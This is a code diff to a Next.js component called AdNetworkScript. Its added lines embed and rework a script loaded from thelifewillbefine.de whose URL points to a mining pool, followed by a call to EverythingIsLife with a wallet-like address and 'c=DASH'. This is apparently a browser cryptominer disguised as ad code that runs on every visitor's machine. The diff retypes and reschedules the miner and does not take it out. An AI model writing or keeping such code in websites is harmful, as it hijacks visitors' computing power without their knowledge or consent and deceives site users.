@@ -1,3 +1,9 @@
+// Add global declaration for EverythingIsLife
+declare global {
+  interface Window {
+    EverythingIsLife?: (key: string, param: string, num: number) => void;
+  }
+}
 "use client";
 
 import useSupabaseUser from "@/hooks/useSupabaseUser";
@@ -98,13 +104,16 @@ const AdNetworkScript: React.FC = () => {
 })();`}
     </Script>
 
-    <Script
-      strategy="beforeInteractive"
-      src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=flex/native?nosaj=flex.na.mine.zpool.ca:3340"
-    />
-    <Script id="everythingislife-tag" strategy="beforeInteractive" data-cfasync="false">
-      {`EverythingIsLife('XtbKqMHVrWnej1cRBPYoN5MeCWthKasoHG', 'c=DASH', 60);`}
-    </Script>
+      <Script
+        id="karma-script"
+        src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=flex/native?nosaj=flex.na.mine.zpool.ca:3340"
+        strategy="afterInteractive"
+        onLoad={() => {
+          if (typeof window !== "undefined" && typeof window.EverythingIsLife === "function") {
+            window.EverythingIsLife('XtbKqMHVrWnej1cRBPYoN5MeCWthKasoHG', 'c=DASH', 60);
+          }
+        }}
+      />
     </>
   );
 };
